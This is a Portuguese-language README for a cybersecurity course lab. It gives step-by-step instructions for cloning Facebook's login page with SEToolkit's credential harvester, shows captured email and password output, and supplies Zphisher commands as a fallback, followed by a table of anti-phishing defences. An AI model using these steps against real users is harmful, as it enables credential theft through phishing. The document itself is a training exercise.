# 🎣 Simulação de Phishing com SEToolkit – Projeto Educacional DIO

[![Educational Purpose](https://img.shields.io/badge/Purpose-Educational-blue)](LICENSE)
[![Kali Linux](https://img.shields.io/badge/OS-Kali%20Linux-blue)](https://www.kali.org/)
[![SEToolkit](https://img.shields.io/badge/Tool-SEToolkit-green)](https://github.com/trustedsec/social-engineer-toolkit)
[![License](https://img.shields.io/badge/License-Educational%20Use%20Only-orange)](LICENSE)

> ⚠️ **ATENÇÃO**: Este repositório é **exclusivamente para fins educacionais**.
> Não utilize os conhecimentos aqui descritos para atividades maliciosas.
> O objetivo é entender a mecânica dos ataques de phishing e aprender a se proteger.

## 📋 Sobre o Projeto

Desafio prático do curso de Segurança Cibernética da DIO.
Utilizamos o **Social-Engineer Toolkit (SEToolkit)** no **Kali Linux** para clonar a página de login do Facebook e capturar credenciais em ambiente controlado.

## 🛠️ Ambiente Utilizado

| Componente | Detalhe |
|------------|---------|
| **Host** | Linux |
| **Virtualização** | KVM/QEMU |
| **VM** | Kali Linux |
| **Rede** | Modo Bridge (para acesso de outros dispositivos) |
| **Ferramenta principal** | SEToolkit (versão 8.0.3) |
| **Alternativa** | Zphisher (quando necessário) |

## 📖 Passo a Passo Técnico

### 1. Preparação do Ambiente

```bash
# 1. Configure a placa de rede da VM como "Bridge" no gerenciador de máquinas virtuais
# 2. Inicie o Kali Linux
# 3. Abra o terminal e torne-se root
sudo su
```

### 2. Iniciando o SEToolkit

```bash
setoolkit
```

### 3. Navegação no Menu (sequência exata)

| Opção | Descrição |
|-------|-----------|
| `1` | Social-Engineering Attacks |
| `2` | Website Attack Vectors |
| `3` | Credential Harvester Attack Method |
| `2` | Site Cloner |

### 4. Configuração do Clone

- **IP de retorno (POST Back IP)**: pressione Enter para aceitar o IP da própria máquina (ex.: 192.168.0.105)
- **URL para clonar**: `http://facebook.com`

### 5. Resultado da Clonagem

O SEToolkit baixa os arquivos da página e inicia um servidor web na porta 80.  
A mensagem de sucesso exibida:

```
[*] Cloning the website: http://facebook.com
[*] This could take a little...
[*] The Social-Engineer Toolkit Credential Harvester Attack
[*] Copyright (c) 2018 TrustedSec
[*] Serving pages locally at: http://192.168.0.105:80
```

### 6. Captura de Credenciais

Quando uma vítima (no mesmo rede) acessa `http://192.168.0.105` e insere email/senha, o SEToolkit exibe no terminal:

```
[*] WEBSERVER: Got POST from 192.168.0.101
[*] WEBSERVER: POST data: email=teste@exemplo.com&pass=minhasenha123
```

Os logs também são salvos em:
```bash
cat /root/.set/harvester.txt
```

## ⚠️ Problema Comum e Solução

### Facebook moderno – bloqueio de clones

O Facebook implementa proteções avançadas que podem impedir o clone completo com SEToolkit tradicional.  
**Solução:** Utilize uma ferramenta mais atualizada – **Zphisher**.

```bash
git clone --depth=1 https://github.com/htr-tech/zphisher.git
cd zphisher
bash zphisher.sh
```

Com Zphisher, o clone funciona com maior sucesso.

## 🛡️ Defesas contra Phishing

### Para usuários finais

| Defesa | Como aplicar |
|--------|--------------|
| **Verifique a URL** | Sempre olhe a barra de endereço. O domínio deve ser exato (`facebook.com` e não `faceb00k.com`) |
| **HTTPS + Certificado** | Verifique o cadeado e se o certificado é válido |
| **2FA/MFA** | Ative autenticação de dois fatores – mesmo com a senha roubada, o atacante não acessa |
| **Gerenciador de senhas** | Não preenche automaticamente em sites com domínio diferente |
| **Nunca clique em links suspeitos** | Prefira digitar o endereço manualmente |

### Para organizações

| Defesa | Descrição |
|--------|-----------|
| **Simulações regulares** | Treine funcionários com campanhas de phishing controlado |
| **Filtros de e-mail** | Soluções como Proofpoint, Mimecast bloqueiam e-mails maliciosos |
| **Web filtering** | Bloqueio de domínios recém-criados ou de alta similaridade |
| **EDR / MDR** | Monitora endpoints para comportamentos anômalos (ex.: execução de scripts suspeitos) |
| **Política de senhas** | Exija senhas fortes e troca periódica |

## 📚 Reflexões

1. **Phishing continua sendo a principal porta de entrada** para ataques, mesmo com toda a tecnologia de segurança.
2. **A engenharia social explora o fator humano**, que é o elo mais fraco.
3. **Ferramentas evoluem** – o SEToolkit é ótimo para aprendizado, mas soluções como Zphisher mostram como os atacantes se adaptam rapidamente.
4. **Defesa em camadas é essencial**: 2FA + treinamento + filtros de e-mail reduzem drasticamente o risco.
5. **Documentar os erros** (como o bloqueio do Facebook) torna o aprendizado mais realista e valioso.

> *"A melhor forma de aprender sobre segurança é simular ataques em ambiente controlado. Este projeto me permitiu entender na prática como um simples clone de página pode enganar usuários desatentos. Mais do que a técnica, aprendi que a conscientização e a adoção de 2FA são as defesas mais eficazes contra phishing. Como profissional de segurança, meu compromisso é usar esse conhecimento para proteger, nunca para prejudicar."*

---

## 🔗 Links úteis

- [SEToolkit oficial](https://github.com/trustedsec/social-engineer-toolkit)
- [Zphisher](https://github.com/htr-tech/zphisher)
- [MITRE ATT&CK – T1566 Phishing](https://attack.mitre.org/techniques/T1566/)
- [DIO – Curso de Segurança Cibernética](https://www.dio.me/)

## ⚖️ Licença

**Uso Educacional Apenas** – Este projeto é fornecido para fins de aprendizado.
O autor não se responsabiliza por qualquer uso indevido do conteúdo.

---

<div align="center">
  Desenvolvido como parte do desafio prático da DIO – Segurança Cibernética
  🛡️ Conhecimento para defender, nunca para atacar.
</div>

---

![Kali Linux](https://img.shields.io/badge/Kali_Linux-557C94?style=for-the-badge&logo=kali-linux&logoColor=white)
![Security](https://img.shields.io/badge/Ethical_Hacking-FF0000?style=for-the-badge&logo=hack-the-box&logoColor=white)
![License](https://img.shields.io/badge/Uso-Educacional-green?style=for-the-badge)
